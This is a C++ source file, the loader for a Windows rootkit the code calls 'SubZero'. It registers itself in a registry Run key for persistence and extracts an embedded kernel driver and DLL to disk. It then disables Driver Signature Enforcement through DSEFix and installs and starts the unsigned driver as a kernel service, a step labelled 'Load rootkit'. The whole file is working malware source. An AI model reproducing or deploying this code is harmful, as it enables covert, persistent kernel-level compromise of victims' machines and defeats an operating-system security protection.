#include "pch.h"
#include "resource.h"
#include "SubZeroLoaderCommon.h"
#include "../SubZeroDriver/SubZeroCommon.h"
#include "../SubZeroUtils/AutoRegistryKeyHandle.h"
#include "../SubZeroUtils/PeResource.h"
#include "../SubZeroUtils/ServiceManager.h"
#include "../SubZeroUtils/RegistryManager.h"

extern "C" {
#include "../DSEFix/DSEFix.h"
}

const std::wstring DRIVER_RESOURCE_NAME(L"PUXY");
const std::wstring DLL_RESOURCE_NAME(L"NKUI");

//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
int wmain(int argc, wchar_t* argv[]) {

	//LoadLibraryA("S:\\Projects\\SubZeroRootkit\\x64\\Release\\SubZeroDLL.dll");
	//LoadLibraryA("C:\\Users\\Daniel\\Desktop\\Drivers\\SubZero\\Release\\SubZeroDLL.dll");
	//return 1;
	
	AutoRegistryKeyHandle autoRegKey(nullptr);
	
	try {						
		autoRegKey.reset(RegistryManager::OpenRegistryKey(REG_SZ_KEY_ROOT, REG_RUN_KEY_PATH));

		// Set current file as startup file - note that the loader register its current location (argv[0])
		// but the rest of the modules assume it is in the fixed path - LOADER_FILE_PATH
		const SIZE_T dwLetterSize = sizeof(WCHAR);		
		RegistryManager::SetRegistryValue(autoRegKey.get(), REG_VALUE_NAME.c_str(), REG_SZ, (PVOID)argv[0], MAX_PATH);
	}
	catch (const Win32ErrorCodeException& exception) {		
		DEBUG_PRINT(exception.what());	
		return 1;
	}

	// Save resources to file system
	try {		 
		const PeResource driverResource(IDR_PUXY1, DRIVER_RESOURCE_NAME);
		driverResource.saveResourceToFileSystem(DRIVER_FULL_PATH);
		DEBUG_PRINT("[+] Driver extracted and saved to file system successfully");
	}
	catch (const Win32ErrorCodeException& exception) {				
		if (exception.getErrorCode() != ERROR_FILE_EXISTS) {

			// Error extracting/saving resource
			DEBUG_PRINT(exception.what());
			RegistryManager::DeleteRegistryValue(autoRegKey.get(), DRIVER_NAMEW);
			return 1;
		}		
	}
	
	 try {
		const PeResource libraryResource(IDR_NKUI1, DLL_RESOURCE_NAME);
		libraryResource.saveResourceToFileSystem(DLL_FULL_PATH);
		DEBUG_PRINT("[+] DLL extracted and saved to file system successfully");
	}
	catch (const Win32ErrorCodeException& exception) {
		if (exception.getErrorCode() != ERROR_FILE_EXISTS) {

			// Error extracting/saving resource
			DEBUG_PRINT(exception.what());
			RegistryManager::DeleteRegistryValue(autoRegKey.get(), DRIVER_NAMEW);
			::DeleteFileW(DRIVER_FULL_PATH.c_str());
			return 1;
		}
	}

	// Disable DSE protection using DSEFix
	DSEFixMain();
	DEBUG_PRINT("[+] DSE protection disabled");

	// Load rootkit
	try {		
		ServiceManager serviceManager(DRIVER_NAMEW, DRIVER_FULL_PATH, SERVICE_KERNEL_DRIVER);
		serviceManager.installAndStart();
		DEBUG_PRINT("[+] Driver installed and started successfully");
	}
	catch (const Win32ErrorCodeException& exception) {
		DEBUG_PRINT(exception.what());		
		RegistryManager::DeleteRegistryValue(autoRegKey.get(), DRIVER_NAMEW);
		::DeleteFileW(DRIVER_FULL_PATH.c_str());
		::DeleteFileW(DLL_FULL_PATH.c_str());
		return 1;
	}

	return 0;
}